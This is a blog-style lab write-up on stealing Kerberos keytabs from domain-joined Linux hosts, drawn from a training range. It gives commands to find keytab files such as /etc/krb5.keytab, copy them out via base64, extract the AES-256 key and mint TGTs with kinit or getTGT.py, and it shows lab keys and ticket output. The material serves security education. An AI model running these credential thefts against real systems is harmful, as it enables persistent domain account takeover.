---
layout: post
title: "Cerberus in a File"
categories: [Kerberos]
tags: [keytab, kerberos, kinit, keytabextract, linux, plaintext-equivalent, ad]
tag_anchors:
  keytab: "#6-letting-the-dog-off-the-leash"
  kerberos: "#1-the-three-headed-dog"
  kinit: "#way-a--keytab-as-a-file-kinit--k--t"
  keytabextract: "#way-b--keytab-as-a-key-source-keytabextract--gettgtpy"
  linux: "#4-the-westbridge-capture"
  plaintext-equivalent: "#2-ticket-vs-keytab-stealing-the-depot"
  ad: "#4-the-westbridge-capture"
wide: true
---

## Prologue: Adopting the Dog

> Why spend a week trying to crack the master's password when you can just adopt the dog?

In an Active Directory environment, administrators go to great lengths to protect passwords. But on domain-joined Linux systems, those identities are often serialized directly to disk to allow for seamless service authentication. This is the credential that didn't ask permission.

## TL;DR

A Kerberos keytab isn't a temporary session token. It is a plaintext-equivalent domain identity, serialized to a file, that mints Ticket Granting Tickets (TGTs) forever. Here is exactly how it works, how to hunt for it, and the operational tooling you need to let it off the leash.

---

## 1. The Three-Headed Dog

Kerberos is named for the three-headed hound that guards the Greek underworld — Cerberus, who keeps the dead in and the living out. In the directory, those three heads are the protocol's core phases: **AS-REQ** (prove who you are), **TGS-REQ** (grab the ticket), and **AP-REQ** (access the target).

Normally, you have to feed the hound a password to get past the first head. A Kerberos keytab is that dog, file-ified.

It skips the interrogation. It doesn't fetch tickets by asking for credentials; it *is* the cryptographic bite. Kerberos never actually trusts a password anyway; it trusts **shared key material**. A keytab is just that key material written to disk. It guards the identity, it mints TGTs on demand, and it never sleeps. It never expires — not until someone actively rotates the key in the directory. You exfil it off a box, drop it on your attacker machine, and it opens the gate without knocking.

---

## 2. Ticket vs. Keytab (Stealing the Depot)

This distinction matters because people often reach for keytabs the exact same way they reach for tickets — but the two have completely different lifespans and threat models.

* **A ticket (`.ccache`/TGT)** is a session artifact. It usually expires in about 10 hours and is completely dead afterward. It is highly useful for the specific window you have it, but it is ultimately garbage once the clock runs out. Capturing a ticket is like catching a bus before midnight.
* **A keytab** is the account's live, long-term key. You don't *use up* a keytab — you use it to *get* tickets, and the keytab survives every single one of them. It will mint fresh TGTs indefinitely until the underlying account's key is rotated. Capturing a keytab isn't catching the bus; it's stealing the keys to the depot.

When a keytab is consumed, no password string ever enters the exchange. It builds an **AS-REQ** where the *authenticator* is encrypted with the account's long-term key. The Key Distribution Center (KDC) decrypts that authenticator with the copy of the key it holds in its own database (`unicodePwd`/supplemental-credentials). If it decrypts cleanly, the KDC has cryptographic proof of identity. The returned **AS-REP** carries a TGT encrypted with that exact same long-term key, which is why only this keytab (or the account's real password) can ever open it.

---

## 3. Hunting the Hound

> Letting sleeping dogs lie is terrible advice when the dog in question mints TGTs forever.

Before you can use a keytab, you have to find it. Because keytabs are used for Kerberos SSO on Linux, they are often buried in `/etc`, `/opt`, or application-specific directories.

*"Find every keytab on every domain-joined Linux box"* is the loot rule that turns a forgotten file into a domain identity. During an engagement, relying on manual directory traversal will leave identities on the table. Drop this quick locator into your shell to sweep the filesystem for standard extensions, MIT Kerberos defaults, and common service locations, redirecting the permission-denied noise to `/dev/null`:

```bash
# The find-every-keytab sweep
➜ find / -name "*.keytab" 2>/dev/null
➜ find / -name "krb5.keytab" 2>/dev/null
➜ ls -la /etc/krb5.keytab 2>/dev/null

# linpeas catches these automatically under:
# [+] Kerberos Tickets
# [+] Impersonation commands
```

---

## 4. The Westbridge Capture

> But you don't always have to hunt. Sometimes, the dog is just sitting on the porch.

In the Westbridge University range, we already had the keytab by the time we noticed what it was. Root on WEB ([Flag03](/hacksmarter/hsm-westbridge-university-range/#14-web-ssh-key-cron-and-a-kerberos-shortcut)) turned `linpeas`' Kerberos section into a loot list, and one of the entries was a file that didn't behave like a standard credential file.

`svc_krb_t2.keytab` was the Tier-2 provisioning account's Cerberus, left on a web server that had forgotten it was there. The university stood it up during an internal migration as the dedicated service identity for Kerberos SSO on Linux, installed the keytab on WEB, and planned to roll it out as the standard for all internal web apps. The rollout never finished — the keytab did.

We pulled it off the box with `base64`, dropped it onto our attacker box, and ran `kinit -k -t svc_krb_t2.keytab` — and a TGT appeared. No password, no crack, no KDC interaction we hadn't already paid for. Two forests, seven hosts, seven flags — and an entire Tier-2 provisioning identity handed to us in a single file.

---

## 5. The `libmagic` Lie (KVNO 3 vs 18)

If you ever look at a keytab and wonder why your tools are lying to you, it's usually because you ran `file` instead of `klist`.

The standard Linux `file` utility relies on `libmagic`, which routinely mis-parses the MIT keytab layout. Look at what happens when we point it at our Westbridge capture:

```bash
➜ file svc_krb_t2.keytab
svc_krb_t2.keytab: Kerberos Keytab file, realm=WESTBRIDGE.HSM, principal=svc_krb_t2/, type=65536, date=Thu Jan  1 00:12:48 1970, kvno=18
```

There are two things to ignore here, and one thing that will break your engagement if you trust it:

* **The Date**: `Thu Jan 1 00:12:48 1970` is just keytab tooling's zero-value placeholder, not a real timestamp. The keytab was created the day the account was provisioned, not during the UNIX epoch.
* **The Type**: `65536` is a parsing artifact.
* **The KVNO (Key Version Number)**: `file` reports `kvno=18`, which is completely wrong. `libmagic` reads the wrong byte offset and confuses the Kerberos encryption type with the KVNO (AES256-CTS-HMAC-SHA1-96 is enctype 18).

To get the canonical view of the file, always use `klist -k`:

```bash
➜ klist -k svc_krb_t2.keytab
Keytab name: FILE:svc_krb_t2.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   3 svc_krb_t2@WESTBRIDGE.HSM
```

One row: **kvno 3**, principal `svc_krb_t2@WESTBRIDGE.HSM`. That is the live key `kinit -k -t` seals the AS-REQ with — the exact same proof of identity a password would give.

The KVNO in your file *must* match the KVNO the KDC expects. If the account's key was rotated (KVNO incremented) but you still have the old keytab, the AS-REP decrypt fails. `klist -k` on the file shows the KVNO you're carrying; if it doesn't match the live directory, the guard dog is dead.

---

## 6. Letting the Dog Off the Leash

The keytab we pulled off WEB's root is a file — and files can be consumed in two ways. Both end at the exact same `svc_krb_t2` TGT. Which one you use depends purely on what tooling you want to leverage next.

### Way A — Keytab as a file (`kinit -k -t`)

The native path. Exfil the binary from the target, decode on the attacker box, and `kinit -k -t` reads the file to mint the TGT. This is silent — the raw AES key never hits your terminal. Clean, fast, and exactly what the keytab format was designed for.

```zsh
## On WEB (root shell) — exfil the keytab as base64
root@web:~# base64 /etc/svc_krb_t2.keytab
BQIAAABLAAEADldFU1RCUklER0UuSFNNAApzdmNfa3JiX3QyAAAAAQAAAAADABIAIAAoC5VFjFon
nMRVXOxfD0nTD/LwVRwVW0SrQCvKd1pU

## On attacker box — decode, verify, kinit
➜ echo 'BQIAAABLAAEADldFU1RCUklER0UuSFNNAApzdmNfa3JiX3QyAAAAAQAAAAADABIAIAAoC5VFjFon
nMRVXOxfD0nTD/LwVRwVW0SrQCvKd1pU' | base64 -d > svc_krb_t2.keytab

➜ kinit -k -t svc_krb_t2.keytab svc_krb_t2@WESTBRIDGE.HSM

➜ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: svc_krb_t2@WESTBRIDGE.HSM

Valid starting       Expires              Service principal
08/23/2026 16:11:15  08/24/2026 02:11:15  krbtgt/WESTBRIDGE.HSM@WESTBRIDGE.HSM
        renew until 08/24/2026 16:11:15
```

From here, `nxc -k --use-kcache` rides the ccache straight into SMB on the DC as `svc_krb_t2` — no password ever cracked.

### Way B — Keytab as a key source (`keytabextract` + `getTGT.py`)

Same exfil, same decoded keytab — but instead of handing the file to `kinit`, we pull the raw AES-256 key out of it with `keytabextract` and hand that key to `getTGT.py -aesKey` to mint the TGT. The key is exposed on your terminal — that's the point.

```bash
➜ keytabextract svc_krb_t2.keytab
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : WESTBRIDGE.HSM
        SERVICE PRINCIPAL : svc_krb_t2/
        AES-256 HASH : 00280b95458c5a279cc4555cec5f0f49d30ff2f0551c155b44ab402bca775a54

➜ getTGT.py westbridge.hsm/svc_krb_t2 \
    -aesKey 00280b95458c5a279cc4555cec5f0f49d30ff2f0551c155b44ab402bca775a54
[*] Saving ticket in svc_krb_t2.ccache
```

Both paths end at the same `svc_krb_t2` TGT. The exposed key in Way B is what makes a keytab a plaintext-equivalent identity rather than just another cred file. `kinit -k -t` never shows it; `keytabextract` does. Reach for this path when you want the raw AES hash (for hashcat, or to pass to another tool), or when `kinit -k -t` simply isn't available.

---

## 7. Muscle Memory & The Loot Rule

Once we had the `svc_krb_t2` ccache in the Westbridge range, we chained it with `ksu` (Kerberos `su`) to map the AD principal directly to the local `root` account on the Linux host.

That specific reflex — minting an AD user named `root`, grabbing its TGT, and handing the ccache to setuid `ksu.mit` to drop into a local root shell — was a cross-box borrowing from DarkZeroReturns, where the exact same trick on SRV01 was the final hop.

But the core primitive—ripping a keytab to become a domain entity permanently—is a universal reflex. During the [GOAD: Dracarys](/goad/goad-dracarys/#51-syraxs-keytab) lab, reading `/etc/krb5.keytab` yielded the `SYRAX$` machine account's NTLM and AES keys. In Westbridge, `/etc/svc_krb_t2.keytab` yielded a Tier-2 provisioning identity. The target changes; the mechanic doesn't.

The keytab primitive that feeds these chains is the lesson that generalizes: a forgotten file on a domain-joined Linux box is a domain identity, and *"find every keytab on every domain-joined Linux box"* is the loot check that turns it into one.

---

### Closing Thoughts

This is the credential that didn't ask permission.

Cerberus in a file. The dog that guards the underworld, serialized onto disk by a migration that never finished, minting TGTs forever because nobody turned on rotation.

You don't need to crack it. You don't need to guess it. You just need to find it.

---

*The full Kerberos mechanics in this post are drawn from the [Westbridge University range](/hacksmarter/hsm-westbridge-university-range/) — the keytab was captured during [Flag03](/hacksmarter/hsm-westbridge-university-range/#146-bonus-loot--keytabs-everywhere) and used in [Section 15](/hacksmarter/hsm-westbridge-university-range/#152-svc_krb_t2-mints-itself-an-ou) and the machine account keytab extraction is referenced from [GOAD: Dracarys](/goad/goad-dracarys/#51-syraxs-keytab).*
